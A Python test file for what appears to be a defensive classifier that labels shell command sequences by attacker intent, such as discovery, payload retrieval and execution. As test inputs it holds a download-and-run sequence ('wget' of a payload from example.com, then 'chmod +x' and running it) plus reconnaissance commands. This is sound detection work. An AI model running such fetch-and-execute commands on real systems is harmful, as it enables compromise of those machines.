from intelligence.intent.classifier import IntentClassifier


def test_discovery_intent():
    classifier = IntentClassifier()

    results = classifier.classify(
        ["whoami", "uname -a", "hostname"]
    )

    intents = {result.intent for result in results}

    assert "discovery" in intents


def test_file_discovery_intent():
    classifier = IntentClassifier()

    results = classifier.classify(
        ["ls", "pwd", "find /tmp"]
    )

    intents = {result.intent for result in results}

    assert "file_discovery" in intents


def test_payload_retrieval_intent():
    classifier = IntentClassifier()

    results = classifier.classify(
        ["wget http://example.com/payload"]
    )

    intents = {result.intent for result in results}

    assert "payload_retrieval" in intents


def test_execution_intent():
    classifier = IntentClassifier()

    results = classifier.classify(
        ["chmod +x payload", "./payload"]
    )

    intents = {result.intent for result in results}

    assert "execution" in intents


def test_empty_commands_return_no_intent():
    classifier = IntentClassifier()

    results = classifier.classify([])

    assert results == []


def test_evidence_is_recorded():
    classifier = IntentClassifier()

    results = classifier.classify(
        ["whoami", "pwd"]
    )

    discovery = next(
        result for result in results
        if result.intent == "discovery"
    )

    file_discovery = next(
        result for result in results
        if result.intent == "file_discovery"
    )

    assert "whoami" in discovery.evidence
    assert "pwd" in file_discovery.evidence
